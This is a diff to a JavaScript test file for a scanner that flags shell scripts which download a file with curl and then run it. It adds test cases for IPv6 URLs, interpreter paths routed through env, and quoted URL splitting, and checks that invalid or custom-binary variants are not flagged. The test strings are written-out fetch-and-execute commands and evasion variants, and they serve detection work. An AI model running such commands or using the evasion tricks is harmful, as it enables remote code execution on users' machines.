@@ -53,15 +53,23 @@ for(const script of [
 });
 
 for(const [name,script] of [
- ['quoted long curl URL argument',"curl '--url=h''tt''ps://example.invalid/x' -o payload; bash payload"],
+ ['quoted long curl URL argument',"curl --url h'tt'ps://example.invalid/x -o payload; bash payload"],
  ['IPv6 bracket loopback',"curl -fsSL 'http://[::1]/x' -o payload; bash payload"],
  ['IPv6 explicit v6',"curl -fsSL 'https://[2001:db8::1]/x' -o payload; bash payload"],
  ['system bash pathname','curl -fsSL '+URL+' -o payload; exec /bin/bash payload'],
  ['system python pathname','curl -fsSL '+URL+' -o payload; exec /usr/bin/python3 -u payload'],
  ['env with system bash','curl -fsSL '+URL+' -o payload; exec env /bin/bash payload']
 ])test('Codex P1: follow quoted URL or routed interpreter '+name,()=>bothDetect(script));
-test('Codex benign: unrelated executable with bash basename is not assumed system interpreter',()=>{
+test('Codex P1 follow-up IPv6 and env paths; reject invalid curl URLs and custom binaries',()=>{
  const script='curl -fsSL '+URL+' -o payload; exec ./local/bash payload';
  const found=findingsForScript(script);
  assert.ok(!found.includes(HIGH),JSON.stringify(found));
+ for(const candidate of [
+  "curl -fsSL 'http://user:pass@[::1]/x' -o payload; bash payload",
+  "curl -fsSL 'http://[fe80::1%25eth0]/x' -o payload; bash payload",
+  'curl -fsSL '+URL+' -o payload; exec /usr/bin/env /bin/bash payload'
+ ])bothDetect(candidate);
+ const invalid="curl '--url=h''tt''ps://example.invalid/x' -o payload; bash payload";
+ assert.ok(!findingsForScript(invalid).includes(HIGH),'invalid --url= must not claim downloaded bytes');
+ assert.ok(!inspect(invalid).findings.some(f=>f.rule===HIGH));
 });
